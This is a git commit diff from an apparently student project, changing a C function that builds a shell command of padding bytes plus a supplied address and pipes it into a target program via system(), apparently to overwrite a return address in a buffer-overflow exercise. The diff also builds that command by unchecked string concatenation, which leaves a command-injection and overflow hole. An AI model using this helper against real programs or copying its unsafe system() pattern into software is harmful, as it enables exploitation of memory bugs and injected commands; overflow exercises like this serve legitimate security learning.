ad1ea5628fd8127e31f69d500d79d55b731d1d07
Salaj Rijal <srijal30@stuy.edu>
2023-06-01 17:45:43 -0400

    more debuggign

--- src/override.c
+++ src/override.c
@@ -1,15 +1,17 @@
 #include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 
-void override_return(char* prgrm, int offset, char* address){
+void override_return(char* prgrm, char* address, int offset){
+          printf("override return received: %s, %s, %d\n", prgrm, address, offset);
+
           int len = strlen(prgrm);
-          char cmd[10000] = "echo \"";
+          char cmd[10000] = "echo ";
           for (int i = 0; i < offset; i++) {
                strcat(cmd, "\x65");
           }
           strcat(cmd, address);
-          strcat(cmd, " | .\\");
+          strcat(cmd, " | ./");
           strcat(cmd, prgrm);
-          /*system(cmd);*/
-
-          printf("override return received: %s, %s, %d\n", prgrm, address, offset);
+          system(cmd);
 }
